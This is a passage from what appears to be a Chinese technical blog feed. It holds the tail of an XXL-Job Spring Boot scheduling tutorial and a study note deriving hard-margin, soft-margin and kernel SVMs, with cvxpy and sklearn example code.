&quot;JobHandler销毁方法&quot;)&quot;，注解value值对应的是调度中心新建任务的JobHandler属性的值。  </span></span><br><span class="line"><span class="comment">    * 3、执行日志：需要通过 &quot;XxlJobLogger.log&quot; 打印执行日志；  </span></span><br><span class="line"><span class="comment">    */</span>  </span><br><span class="line">    <span class="meta">@XxlJob(&quot;demoJobHandler&quot;)</span>  </span><br><span class="line">    <span class="keyword">public</span> ReturnT&lt;String&gt; <span class="title function_">demoJobHandler</span><span class="params">(String param)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        XxlJobHelper.log(<span class="string">&quot;java, Hello World~~~&quot;</span>);  </span><br><span class="line">        XxlJobHelper.log(<span class="string">&quot;param:&quot;</span> + param);  </span><br><span class="line">        <span class="keyword">return</span> ReturnT.SUCCESS;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在管理平台新建任务：</p><p><img src="/img/2024/07/3.png" alt="image.png"></p><p>JobHandler为上述代码@XxlJob注解中的值</p><p>随后运行该Springboot应用，可在管理平台执行一次或启动任务</p><p><img src="/img/2024/07/4.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 开发技能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 定时任务 </tag>
            
            <tag> SpringBoot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>机器学习笔记——SVM丝滑推导及代码实现，从硬间隔到软间隔再到核函数</title>
      <link href="/2024/06/01/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94SVM%E4%B8%9D%E6%BB%91%E6%8E%A8%E5%AF%BC%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0%EF%BC%8C%E4%BB%8E%E7%A1%AC%E9%97%B4%E9%9A%94%E5%88%B0%E8%BD%AF%E9%97%B4%E9%9A%94%E5%86%8D%E5%88%B0%E6%A0%B8%E5%87%BD%E6%95%B0/"/>
      <url>/2024/06/01/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94SVM%E4%B8%9D%E6%BB%91%E6%8E%A8%E5%AF%BC%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0%EF%BC%8C%E4%BB%8E%E7%A1%AC%E9%97%B4%E9%9A%94%E5%88%B0%E8%BD%AF%E9%97%B4%E9%9A%94%E5%86%8D%E5%88%B0%E6%A0%B8%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>开始搓延期了一百年的机器学习实验，把SVM推导过程从定义到求解都刷了一遍，包括推导优化目标、提出对偶问题、利用KKT条件得到原问题的解以及SMO算法等。</p><p>注意：本文在某些地方比如KKT条件和SMO算法处不提供证明过程(太麻烦了喵)，而是直接使用其结论，感兴趣的读者可以查阅参考资料</p><p>参考资料：</p><p>推导过程学习视频：<a href="https://www.bilibili.com/video/BV1aE411o7qd?p=28">(系列六) 支持向量机1-硬间隔SVM-模型定义_哔哩哔哩_bilibili</a></p><p>拉格朗日对偶性的条件：<a href="https://blog.csdn.net/weixin_41960890/article/details/105254796">拉格朗日对偶性详解（手推笔记）-CSDN博客</a></p><p>从几何角度理解KKT条件和对偶关系：<a href="https://www.cnblogs.com/Epir/p/13170152.html">机器学习笔记(8)-对偶关系和KKT条件 - Epir - 博客园 (cnblogs.com)</a>‘</p><p>代码参考：<a href="https://www.cnblogs.com/orion-orion/p/15200880.html">统计学习：线性可分支持向量机(Cvxpy实现) - orion-orion - 博客园 (cnblogs.com)</a></p><h1 id="一、优化问题"><a href="#一、优化问题" class="headerlink" title="一、优化问题"></a>一、优化问题</h1><p>当一个分类问题线性可分时，我们希望找到一个最优的超平面将其划分，这个最优的超平面需要满足以下性质：</p><p><strong>超平面</strong> 和 <strong>距超平面最近的样本点</strong> 之间的间隔应该尽可能大</p><blockquote><p>举一个简单的例子：</p><p>当这是一个二分类问题，且样本点特征数为2时（点可以表示在二维平面），该超平面是一条一维的直线。那么，我们想要找到能够将两类数据划分的最优的直线，它与距离它最近的点的距离应该尽可能大</p></blockquote><p>那么我们的优化问题可以描述为：</p><p>给定样本点$X = (x_1, x_2, …, x_m)^T, X \in R^{m \times n}, x_i \in R^n$<br>给定标签$y = (y_1, y_2, …, y_m)^T, y\in R^m, y_i \in {-1, 1}$代表样本点$x_i$所属的类<br>先求一最优的超平面$w^T x + b = 0$将$y_i$的值不同的样本点分割开，也就是求</p><script type="math/tex; mode=display">max_{w, b} min_{x_i} \frac{| w^T x_i + b |}{\| w \|} \quad s.t. \quad y_i(w^T x_i + b) > 0</script><p>由于$y_i(w^T x_i + b) = | w^T x_i + b |$，原问题等价于</p><script type="math/tex; mode=display">max_{w, b} min_{x_i} \frac{y_i(w^T x_i + b)}{\| w \|} \quad s.t. \quad y_i(w^T x_i + b) > 0</script><p>由于最小化问题是关于$x_i$的，那么$| w |$便是无关变量，可往前提</p><script type="math/tex; mode=display">max_{w, b} \frac{1}{\| w \|} min_{x_i} y_i(w^T x_i + b) \quad s.t. \quad y_i(w^T x_i + b) > 0</script><p>由$y_i(w^T x_i + b) &gt; 0$得</p><p>$\exists \gamma &gt; 0$使得$min_{x_i}(y_i(w^T x_i + b)) = \gamma$</p><p>也就是$y_i(w^T x_i + b) &gt;= \gamma$</p><p>由于$w$和$b$的缩放不影响样本点到超平面的几何距离，可取$\gamma = 1$方便讨论</p><p>将$min_{x_i}(y_i(w^T x_i + b)) = 1$代入到上述优化问题中，并修改约束如下：</p><script type="math/tex; mode=display">max_{w, b} \frac{1}{\| w \|}  \quad s.t. \quad y_i(w^T x_i + b) >= 1</script><p>问题等同于</p><script type="math/tex; mode=display">min_{w, b} \frac{1}{2} w^T w \quad s.t. \quad y_i(w^T x_i + b) >= 1</script><script type="math/tex; mode=display">min_{w, b} \frac{1}{2} w^T w \quad s.t. \quad 1- y_i(w^T x_i + b) <= 0</script><h1 id="二、对偶问题"><a href="#二、对偶问题" class="headerlink" title="二、对偶问题"></a>二、对偶问题</h1><h2 id="1-得到对偶问题"><a href="#1-得到对偶问题" class="headerlink" title="1. 得到对偶问题"></a>1. 得到对偶问题</h2><p>构造上述问题的广义拉格朗日函数：</p><script type="math/tex; mode=display">\mathcal{L}(w, b, \alpha) = \frac{1}{2} w^T w + \Sigma_{i = 1}^n  \alpha_i (1- y_i(w^T x_i + b)) \quad (\alpha_i >= 0)</script><p>由拉格朗日对偶性：</p><blockquote><p><strong>拉格朗日对偶性</strong></p><p>对于 $min_x f(x) \quad  \<br>s.t. \quad c_i(x) &lt; = 0, i = 1, …, k \<br>\quad \quad   h_j(x) = 0, j = 1, …, l$</p><p>构造广义拉格朗日函数如下：</p><script type="math/tex; mode=display">\mathcal{L}(w, \alpha, \beta) = f(x) + \Sigma_{i=1}^k \alpha_i c_i(x) + \Sigma_{j=1}^l \beta c_i(x) \quad (\alpha_i >= 0)</script><p>那么原问题<strong>等价于</strong></p><script type="math/tex; mode=display">min_x max_{\alpha, \beta} \mathcal{L}(x, \alpha, \beta)</script><p>证明：</p><p>$max_{\alpha, \beta} \mathcal{L}(x, \alpha, \beta) = \left{ \<br>\begin{matrix} f(x), \quad x满足约束 \ \infty ,\quad x不满足约束\<br>\end{matrix} \right.$</p><p>$min_x max_{\alpha, \beta} \mathcal{L}(x, \alpha, \beta) \<br>\Leftrightarrow min_x f(x), \quad x满足约束$</p><p>对于任意极大极小问题：$min_a max_b f(a, b)$</p><p>对应的极小极大问题：$max_b min_a f(a, b)$都是它的<strong>弱对偶</strong>问题，即</p><p>$max_b min_a f(a, b) &lt;= min_a max_b f(a, b)$</p><p>证明：</p><p>由于$min_a f(a, b) &lt;= f(a, b) &lt;= max_b f(a, b)$</p><p>得$min_a f(a, b) &lt;= max_b f(a, b)$</p><p>由于该式恒成立，那么左式取最大值，右式取最小值时仍然成立：</p><script type="math/tex; mode=display">max_b min_a f(a, b) <= min_a max_b f(a, b)</script><p>当问题满足以下两个条件时，上述不等式取等号，也就是强对偶关系</p><ol><li>原问题是凸优化问题</li><li>原问题满足slater条件</li></ol><p>凸优化问题：目标函数是凸函数，并且可行域是凸集<br>slater条件：所有约束函数都是凸函数并且存在满足所有约束的点</p><p>由于$min_x max_{\alpha, \beta} \mathcal{L}(x, \alpha, \beta)$是关于$x$的优化问题<br>而对偶问题$max_{\alpha, \beta} min_x \mathcal{L}(x, \alpha, \beta)$是关于$\alpha$和$\beta$的问题<br>当两者<strong>满足强对偶关系</strong>时，可以利用<strong>KKT条件</strong>将对偶问题的解映射到原问题的解</p><p>KKT条件的表述如下：</p><p>设<script type="math/tex">\alpha^*, \beta^*</script>是对偶问题的解，$x^*$是原问题的解，那它们满足以下条件：</p><p>1.可行条件</p><p>$c_i(x^<em>) &lt; = 0, i = 1, …, k \<br>h_j(x^</em>) = 0, j = 1, …, l \<br>\alpha_i^* &gt;= 0$</p><p>2.互补松弛条件</p><p>$\alpha_i^<em> c_i(x^</em>) = 0, i = 1, …, k $</p><p>3.梯度为0</p><p>$\nabla_t \mathcal{L}(t, \alpha^<em>, \beta^</em>)|_{t=x^*} = 0$</p></blockquote><p>综上，原问题的对偶问题为</p><script type="math/tex; mode=display">max_{\alpha} min_{w, b} \mathcal{L}(w, b, \alpha)</script><p>对于$min_{w, b} \mathcal{L}(w, b, \alpha)$，对$w, b$求偏导，得</p><p>$\nabla_w \mathcal{L}(w, b, \alpha) = w - \Sigma_{i=1}^n \alpha_i y_i x_i = 0$</p><p>$\nabla_b \mathcal{L}(w, b, \alpha) = - \Sigma_{i=1}^n \alpha_i y_i = 0$</p><p>即</p><p>$w = \Sigma_{i=1}^n \alpha_i y_i x_i$</p><p>$\Sigma_{i=1}^n \alpha_i y_i = 0$</p><p>将上述两式代入到对偶问题中，得</p><p>$max_{\alpha} -\frac{1}{2} \Sigma_{i=1}^n \Sigma_{j=1}^n \alpha_i \alpha_j y_i y_j x_i^T x_j + \Sigma_{i = 1}^n  \alpha_i  \<br>s.t.  \quad \Sigma_{i=1}^n \alpha_i y_i = 0 \<br>\quad \quad \quad \alpha_i &gt;= 0$</p><p>该最大化问题等同于以下最小化问题</p><p>$min_{\alpha} \frac{1}{2} \Sigma_{i=1}^n \Sigma_{j=1}^n \alpha_i \alpha_j y_i y_j x_i^T x_j - \Sigma_{i = 1}^n  \alpha_i  \<br>s.t.  \quad \Sigma_{i=1}^n \alpha_i y_i = 0 \<br>\quad \quad \quad \alpha_i &gt;= 0$</p><h2 id="2-求解过程"><a href="#2-求解过程" class="headerlink" title="2. 求解过程"></a>2. 求解过程</h2><p>求上述问题的最优解$\alpha^*$（使用SMO算法）</p><p>之后，由KKT条件，有</p><p>梯度为0：</p><script type="math/tex; mode=display">\nabla_w \mathcal{L}(w^*, b^*, \alpha^*) = w^* - \Sigma_{i=1}^n \alpha_i^* y_i x_i = 0</script><script type="math/tex; mode=display">w^* = \Sigma_{i=1}^n \alpha_i^* y_i x_i</script><p>互补松弛条件：</p><script type="math/tex; mode=display">\alpha_i^* (1- y_i((w^*)^T x_i + b^*)) = 0, \quad i = 1, 2, ..., n</script><p>设$\forall \alpha_i^<em> = 0$，由上，那么$w^</em> = 0$，而$w^<em> = 0$不是原问题的解，因而假设不成立。存在一个$\alpha_j^</em> &gt; 0$</p><p>那么，取任一$\alpha_j^* &gt; 0$，存在</p><script type="math/tex; mode=display">y_j((w^*)^T x_j + b^*) = 1</script><p>由于$y_j^2 = 1$，等式左右乘以$y_j$，得到</p><script type="math/tex; mode=display">(w^*)^T x_j + b^* = y_j</script><script type="math/tex; mode=display">b^* = y_j - (w^*)^T x_j  = y_j - \Sigma_{i=1}^n \alpha_i y_i x_i^T x_j</script><p>故，求得的最优超平面可写作：</p><script type="math/tex; mode=display">\Sigma_{i=1}^n \alpha_i^* y_i x_i^T x + b^* = 0</script><p>决策函数可写作：</p><script type="math/tex; mode=display">f(x) = sign(\Sigma_{i=1}^n \alpha_i^* y_i x_i^T x + b^*)</script><h1 id="三、软间隔"><a href="#三、软间隔" class="headerlink" title="三、软间隔"></a>三、软间隔</h1><h2 id="1-得到优化问题"><a href="#1-得到优化问题" class="headerlink" title="1. 得到优化问题"></a>1. 得到优化问题</h2><p>当不同类别的样本轻微混杂在一起，导致线性不可分时，原先的优化问题无法得到最优解。所以修改约束条件使其允许一定的误差：</p><p>$min_{w, b} \frac{1}{2} w^T w  + loss$</p><p>假如将$loss$定义为</p><p>$loss = \left{ \ \begin{matrix} 1, \quad y_i(w^T x_i + b) &lt; 1 \ 0 , \quad  y_i(w^T x_i + b) &gt;= 1\ \end{matrix} \right.$</p><p>但是它不连续，数学性质不好</p><p>故定义$loss$为</p><p>$loss = \left{ \ \begin{matrix} 1 - y_i(w^T x_i + b), \quad y_i(w^T x_i + b) &lt; 1 \ 0 , \quad  y_i(w^T x_i + b) &gt;= 1\ \end{matrix} \right.$</p><p>即</p><p>$loss = max{0, 1 - y_i(w^T x_i + b) }$</p><p>记$\xi_i = 1 - y_i(w^T x_i + b)$，由于样本无法完全满足原问题的约束$y_i(w^T x_i + b) &gt;= 1$，修改其约束为：</p><p>$y_i(w^T x_i + b) &gt;= 1 - \xi_i, \quad \xi_i &gt;= 0$</p><p>因此，软间隔的SVM的优化问题为：</p><p>$min_{w, b, \xi} \frac{1}{2} w^T w  + C \Sigma_{i=1}^n \xi_i \<br>s.t. \quad  y_i(w^T x_i + b) &gt;= 1 - \xi_i, \quad i = 1, 2, …, n\<br>\quad \quad \quad \xi_i &gt;= 0, \quad i = 1, 2, …, n$</p><h2 id="2-求解过程-1"><a href="#2-求解过程-1" class="headerlink" title="2. 求解过程"></a>2. 求解过程</h2><p>同理，构造广义拉格朗日函数：</p><p>$\mathcal{L}(w, b, \xi, \alpha, \beta) = \frac{1}{2} w^T w + C\Sigma_{i=1}^n \xi_i - \Sigma_{i = 1}^n  \alpha_i (y_i(w^T x_i + b) - 1 + \xi_i) - \Sigma_{i=1}^n \beta_i \xi_i \<br>s.t. \quad \alpha_i &gt;= 0 \<br>\quad \quad \beta_i &gt;= 0$</p><p>对$w, b, \xi_i$求偏导，得</p><p>$\nabla_w \mathcal{L} = w - \Sigma_{i=1}^n \alpha_i y_i x_i = 0$</p><p>$\nabla_b \mathcal{L} = - \Sigma_{i=1}^n \alpha_i y_i = 0$</p><p>$\nabla_{\xi_i} \mathcal{L} = C - \alpha_i - \beta_i = 0$</p><p>同理，将上述式子代入到对偶问题$max_{\alpha, \beta} min_{w, b, \xi} \mathcal{L}$，得</p><p>$max_{\alpha} -\frac{1}{2} \Sigma_{i=1}^n \Sigma_{j=1}^n \alpha_i \alpha_j y_i y_j x_i^T x_j + \Sigma_{i = 1}^n  \alpha_i  \<br>s.t.  \quad \Sigma_{i=1}^n \alpha_i y_i = 0 \<br>\quad \quad \quad C - \alpha_i - \beta_i = 0 \<br>\quad \quad \quad \alpha_i &gt;= 0 \<br>\quad \quad \quad \beta_i &gt;= 0 $</p><p>由$C - \alpha_i - \beta_i = 0$和$\beta_i &gt;= 0$，得$C - \alpha_i &gt;= 0$，即$\alpha_i &lt;= C$</p><p>对偶问题表示如下：</p><p>$max_{\alpha} -\frac{1}{2} \Sigma_{i=1}^n \Sigma_{j=1}^n \alpha_i \alpha_j y_i y_j x_i^T x_j + \Sigma_{i = 1}^n  \alpha_i  \<br>s.t.  \quad \Sigma_{i=1}^n \alpha_i y_i = 0 \<br>\quad \quad \quad 0 &lt;= \alpha_i &lt;= C $</p><p>求上述问题的最优解$\alpha^*$</p><p>同理，由KKT条件，取一$\alpha_j^<em>$满足$0 &lt; \alpha_j^</em> &lt; C$</p><p>得到</p><script type="math/tex; mode=display">w^* = \Sigma_{i=1}^n \alpha_i^* y_i x_i</script><script type="math/tex; mode=display">b^* = y_j - (w^*)^T x_j  = y_j - \Sigma_{i=1}^n \alpha_i y_i x_i^T x_j</script><h1 id="四、核函数"><a href="#四、核函数" class="headerlink" title="四、核函数"></a>四、核函数</h1><p>当样本线性不可分时，可以将低维不可分的数据映射到高维，从而找到更高维的超平面将其分割</p><p>在对偶问题中，需要计算两个样本点之间的内积，当样本的特征数即维度很大时，计算内积相当耗时</p><p>故引入核函数直接求得两个样本点映射到高维空间后它们的内积：</p><p>$K(x_i, x_j) = \Phi(x_i)^T \Phi(x_j)$</p><p>对偶问题中的目标函数便可以写作：</p><p>$W(\alpha) = \frac{1}{2} \Sigma_{i=1}^n \Sigma_{j=1}^n \alpha_i \alpha_j y_i y_j K(x_i, x_j) - \Sigma_{i = 1}^n  \alpha_i$</p><p>最优超平面可以写作：</p><script type="math/tex; mode=display">\Sigma_{i=1}^n \alpha_i^* y_i K(x_i, x_j) + b^* = 0</script><p>决策函数可以写作：</p><script type="math/tex; mode=display">f(x) = sign(\Sigma_{i=1}^n \alpha_i^* y_i K(x_i, x)+ b^*)</script><h1 id="五、代码实现"><a href="#五、代码实现" class="headerlink" title="五、代码实现"></a>五、代码实现</h1><h2 id="1-cvxpy实现"><a href="#1-cvxpy实现" class="headerlink" title="1. cvxpy实现"></a>1. cvxpy实现</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> copy</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> cvxpy <span class="keyword">as</span> cp</span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> datasets</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> accuracy_score</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SVM</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, C=<span class="literal">None</span>, KF=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="comment"># when self.C is not None, there is the soft-margin SVM</span></span><br><span class="line">        self.C = C</span><br><span class="line">        self.KF = KF</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">K</span>(<span class="params">self, i, j</span>):</span><br><span class="line">        <span class="keyword">if</span> self.KF <span class="keyword">and</span> <span class="built_in">callable</span>(self.KF):</span><br><span class="line">            <span class="keyword">return</span> self.KF(self.X_train[i], self.X_train[j])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.X_train[i].T @ self.X_train[j]</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">object_func</span>(<span class="params">self, alpha</span>):</span><br><span class="line">        <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.n):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(self.n):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;calculate entry: （%d, %d)&quot;</span> % (i, j))</span><br><span class="line">                <span class="built_in">sum</span> += alpha[i] * alpha[j] * self.y_train[i] * self.y_train[j] * self.K(i, j)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0.5</span> * <span class="built_in">sum</span> - cp.<span class="built_in">sum</span>(alpha)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fit</span>(<span class="params">self, X_train, y_train</span>):</span><br><span class="line">        self.X_train = copy.deepcopy(X_train)</span><br><span class="line">        self.y_train = copy.deepcopy(y_train)</span><br><span class="line">        self.n = self.X_train.shape[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;begin to construct the convex problem...&quot;</span>)</span><br><span class="line">        alpha = cp.Variable(self.n)</span><br><span class="line">        objective = cp.Minimize(self.object_func(alpha))</span><br><span class="line">        constraint = []</span><br><span class="line">        <span class="keyword">if</span> self.C:</span><br><span class="line">            constraint = [alpha &gt;= <span class="number">0</span>, alpha &lt;= C, self.y_train @ alpha == <span class="number">0</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            constraint = [alpha &gt;= <span class="number">0</span>, self.y_train @ alpha == <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;convex problem have built...&quot;</span>)</span><br><span class="line">        prob = cp.Problem(objective, constraint)</span><br><span class="line">        prob.solve(solver=<span class="string">&#x27;CVXOPT&#x27;</span>)</span><br><span class="line">        self.alpha_star = alpha.value</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;dual problem have been solved!&quot;</span>)</span><br><span class="line">        <span class="comment"># KKT条件求解w和b</span></span><br><span class="line">        self.w = np.zeros(self.X_train.shape[<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.n):</span><br><span class="line">            self.w += X_train[i] * (self.alpha_star[i] * y_train[i])</span><br><span class="line"></span><br><span class="line">        S_with_idx = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> self.C:</span><br><span class="line">            S_with_idx = [(alpha_star_i, idx)</span><br><span class="line">                          <span class="keyword">for</span> idx, alpha_star_i <span class="keyword">in</span> <span class="built_in">enumerate</span>(self.alpha_star) <span class="keyword">if</span> <span class="number">0</span> &lt; alpha_star_i &lt; self.C]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            S_with_idx = [(alpha_star_i, idx)</span><br><span class="line">                          <span class="keyword">for</span> idx, alpha_star_i <span class="keyword">in</span> <span class="built_in">enumerate</span>(self.alpha_star) <span class="keyword">if</span> alpha_star_i &gt; <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        (_, s) = choice(S_with_idx)</span><br><span class="line">        self.b = y_train[s]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.n):</span><br><span class="line">            self.b -= self.alpha_star[i] * y_train[i] * (X_train[i].T @ X_train[s])</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pred</span>(<span class="params">self, x</span>):</span><br><span class="line">        <span class="keyword">if</span> self.KF <span class="keyword">and</span> <span class="built_in">callable</span>(self.KF):</span><br><span class="line">            y = np.zeros(self.X_train.shape[<span class="number">1</span>])</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.n):</span><br><span class="line">                y += self.alpha_star[i] * y_train[i] * self.KF(self.X_train[i], x)</span><br><span class="line">            y += self.b</span><br><span class="line">            <span class="keyword">return</span> y</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.w.T @ x + self.b</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">acc</span>(<span class="params">self, X_test, y_test</span>):</span><br><span class="line">        y_pred = []</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> X_test:</span><br><span class="line">            y_hat = np.sign(self.pred(x))</span><br><span class="line">            y_pred.append(y_hat)</span><br><span class="line">        y_pred = np.array(y_pred)</span><br><span class="line">        acc = accuracy_score(y_pred, y_test)</span><br><span class="line">        <span class="keyword">return</span> acc</span><br></pre></td></tr></table></figure><p>读取数据集并实现SVM实例<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">X, y = datasets.load_digits(return_X_y=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># X, y = datasets.load_breast_cancer(return_X_y=True)</span></span><br><span class="line"><span class="comment"># X, y = datasets.load_wine(return_X_y=True)</span></span><br><span class="line"><span class="comment"># X, y = datasets.load_iris(return_X_y=True)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">y = np.where(y == <span class="number">1</span>, y, -<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(X.shape, y.shape)</span><br><span class="line"></span><br><span class="line">X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=<span class="number">0.2</span>, random_state=<span class="number">42</span>)</span><br><span class="line"></span><br><span class="line">classicSVM = SVM()</span><br><span class="line">classicSVM.fit(X_train, y_train)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;acc of classic SVM: &quot;</span>, classicSVM.acc(X_test, y_test))</span><br><span class="line"></span><br><span class="line">C = <span class="number">0.1</span></span><br><span class="line">softSVM = SVM(C=C)</span><br><span class="line">softSVM.fit(X_train, y_train)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;acc of soft SVM: &quot;</span>, softSVM.acc(X_test, y_test))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 选择最优的C</span></span><br><span class="line"><span class="comment"># for i in range(-10, 10):</span></span><br><span class="line"><span class="comment">#     C = pow(10, i)</span></span><br><span class="line"><span class="comment">#     softSVM = SVM(C=C)</span></span><br><span class="line"><span class="comment">#     softSVM.fit(X_train, y_train)</span></span><br><span class="line"><span class="comment">#     print(&quot;when C = %e, acc of softSVM SVM: %.4f&quot;</span></span><br><span class="line"><span class="comment">#           % (C, softSVM.pred(X_test, y_test)))</span></span><br></pre></td></tr></table></figure></p><p>没用SMO算法。。跑的巨慢，摆了</p><h2 id="2-sklearn实现"><a href="#2-sklearn实现" class="headerlink" title="2. sklearn实现"></a>2. sklearn实现</h2><p>哈哈我是调包侠</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> datasets</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> accuracy_score</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"><span class="keyword">from</span> sklearn.svm <span class="keyword">import</span> SVC</span><br><span class="line"></span><br><span class="line">X, y = datasets.load_digits(return_X_y=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># X, y = datasets.load_breast_cancer(return_X_y=True)</span></span><br><span class="line"><span class="comment"># X, y = datasets.load_wine(return_X_y=True)</span></span><br><span class="line"><span class="comment"># X, y = datasets.load_iris(return_X_y=True)</span></span><br><span class="line">y = np.where(y == <span class="number">1</span>, y, -<span 